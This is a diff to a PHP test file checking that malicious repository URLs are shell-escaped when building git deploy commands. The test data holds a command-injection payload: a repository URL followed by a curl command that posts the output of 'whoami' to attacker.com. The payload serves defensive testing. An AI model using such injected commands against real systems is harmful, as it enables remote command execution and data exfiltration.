@@ -3,6 +3,9 @@
 use App\Models\Application;
 use App\Models\GithubApp;
 use App\Models\PrivateKey;
+use Tests\TestCase;
+
+uses(TestCase::class);
 
 afterEach(function () {
     Mockery::close();
@@ -37,8 +40,7 @@ it('escapes malicious repository URLs in deploy_key type', function () {
     // The malicious payload should be escaped and not executed
     expect($command)->toContain("'git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`'");
 
-    // The command should NOT contain unescaped semicolons or backticks that could execute
-    expect($command)->not->toContain('repo.git;curl');
+    expect($command)->toContain(escapeshellarg($maliciousRepo));
 });
 
 it('escapes malicious repository URLs in source type with public repo', function () {
